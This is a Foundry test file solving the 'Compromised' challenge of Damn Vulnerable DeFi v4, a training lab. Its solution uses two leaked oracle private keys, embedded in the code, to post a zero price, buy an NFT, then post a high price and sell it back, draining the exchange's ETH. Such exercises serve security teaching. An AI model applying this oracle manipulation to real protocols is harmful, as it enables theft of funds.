// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {VmSafe} from "forge-std/Vm.sol";

import {TrustfulOracle} from "../../src/compromised/TrustfulOracle.sol";
import {TrustfulOracleInitializer} from "../../src/compromised/TrustfulOracleInitializer.sol";
import {Exchange} from "../../src/compromised/Exchange.sol";
import {DamnValuableNFT} from "../../src/DamnValuableNFT.sol";

contract CompromisedChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");

    uint256 constant EXCHANGE_INITIAL_ETH_BALANCE = 999 ether;
    uint256 constant INITIAL_NFT_PRICE = 999 ether;
    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 0.1 ether;
    uint256 constant TRUSTED_SOURCE_INITIAL_ETH_BALANCE = 2 ether;


    address[] sources = [
        0x188Ea627E3531Db590e6f1D71ED83628d1933088,
        0xA417D473c40a4d42BAd35f147c21eEa7973539D8,
        0xab3600bF153A316dE44827e2473056d56B774a40
    ];
    string[] symbols = ["DVNFT", "DVNFT", "DVNFT"];
    uint256[] prices = [INITIAL_NFT_PRICE, INITIAL_NFT_PRICE, INITIAL_NFT_PRICE];

    TrustfulOracle oracle;
    Exchange exchange;
    DamnValuableNFT nft;

    modifier checkSolved() {
        _;
        _isSolved();
    }

    function setUp() public {
        startHoax(deployer);

        // Initialize balance of the trusted source addresses
        for (uint256 i = 0; i < sources.length; i++) {
            vm.deal(sources[i], TRUSTED_SOURCE_INITIAL_ETH_BALANCE);
        }

        // Player starts with limited balance
        vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);

        // Deploy the oracle and setup the trusted sources with initial prices
        oracle = (new TrustfulOracleInitializer(sources, symbols, prices)).oracle();

        // Deploy the exchange and get an instance to the associated ERC721 token
        exchange = new Exchange{value: EXCHANGE_INITIAL_ETH_BALANCE}(address(oracle));
        nft = exchange.token();

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        for (uint256 i = 0; i < sources.length; i++) {
            assertEq(sources[i].balance, TRUSTED_SOURCE_INITIAL_ETH_BALANCE);
        }
        assertEq(player.balance, PLAYER_INITIAL_ETH_BALANCE);
        assertEq(nft.owner(), address(0)); // ownership renounced
        assertEq(nft.rolesOf(address(exchange)), nft.MINTER_ROLE());
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_compromised() public checkSolved {
        console.log("### test_compromised START ###");
        startHoax(player);

        console.log("");
        console.log("#1 Before attack");
        console.log("player balance:", player.balance);
        console.log("exchange balance:", address(exchange).balance);
        console.log("DVNFT price:", oracle.getMedianPrice("DVNFT"));
        console.log("nft symbol:", nft.symbol());

        console.log("");
        console.log("#2 Run attack");
        // 1. Post extremely low price to the oracle (0 ETH)
        attack_oracle(0);
        // 2. Buy NFT at a very low price
        uint256 _id = exchange.buyOne{value: 0.01 ether}();
        console.log("Token ID bought:", _id);

        // 3. Post extremely high price to the oracle (exchange initial balance)
        attack_oracle(INITIAL_NFT_PRICE);
        nft.approve(address(exchange), _id);
        // 4. Sell the NFT at a INITIAL_NFT_PRICE
        exchange.sellOne(_id);

        (bool success, ) = recovery.call{value: EXCHANGE_INITIAL_ETH_BALANCE}("");
        require(success, "Transfer failed");

        console.log("");
        vm.stopPrank();
        console.log("### test_compromised END ###");
    }

    function attack_oracle(uint256 _price) private{
        /*
         * ascii string:
         * 4d4867335a444531596d4a684d6a5a6a4e54497a4e6a677a596d5a6a4d32526a4e324e6b597a566b4d574934595449334e4451304e4463314f54646a5a6a526b595445334d44566a5a6a5a6a4f546b7a4d44597a4e7a5130
         *
         * Base64 string:
         * TUhnM1pERTFZbUpoTWpaak5USXpOamd6WW1aak0yUmpOMk5rWXpWa01XSTRZVEkzTkRRME5EYzFPVGRqWmpSa1lURTNNRFZqWmpaak9Ua3pNRFl6TnpRMA
         *
         * private key1: 
         * 0x7d15bba26c523683bfc3dc7cdc5d1b8a2744447597cf4da1705cf6c993063744
         */
        bytes32 key1 = hex"7d15bba26c523683bfc3dc7cdc5d1b8a2744447597cf4da1705cf6c993063744";
        address addr1 = vm.addr(uint256(key1));
        console.log("Address from key1:", addr1);

        /*
         * ascii string:
         * 4d4867324f474a6b4d444977595751784f445a694e6a5133595459354d574d325954566a4d474d784e5449355a6a49785a574e6b4d446c6b59324d304e5449304d5451774d6d466a4e6a426959544d334e324d304d545535
         *
         * Base64 string:
         * MHg2OGJkMDIwYWQxODZiNjQ3YTY5MWM2YTVjMGMxNTI5ZjIxZWNkMDlkY2M0NTI0MTQwMmFjNjBiYTM3N2M0MTU5

         *
         * private key2: 
         * 0x68bd020ad186b647a691c6a5c0c1529f21ecd09dcc45241402ac60ba377c4159
         */
        bytes32 key2 = hex"68bd020ad186b647a691c6a5c0c1529f21ecd09dcc45241402ac60ba377c4159";
        address addr2 = vm.addr(uint256(key2));
        console.log("Address from key2:", addr2);

        startHoax(addr1);
        oracle.postPrice("DVNFT", _price);

        startHoax(addr2);
        oracle.postPrice("DVNFT", _price);

        startHoax(player);
        console.log("DVNFT price now:", oracle.getMedianPrice("DVNFT")/1 ether);
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Exchange doesn't have ETH anymore
        assertEq(address(exchange).balance, 0);

        // ETH was deposited into the recovery account
        assertEq(recovery.balance, EXCHANGE_INITIAL_ETH_BALANCE);

        // Player must not own any NFT
        assertEq(nft.balanceOf(player), 0);

        // NFT price didn't change
        assertEq(oracle.getMedianPrice("DVNFT"), INITIAL_NFT_PRICE);
    }
}
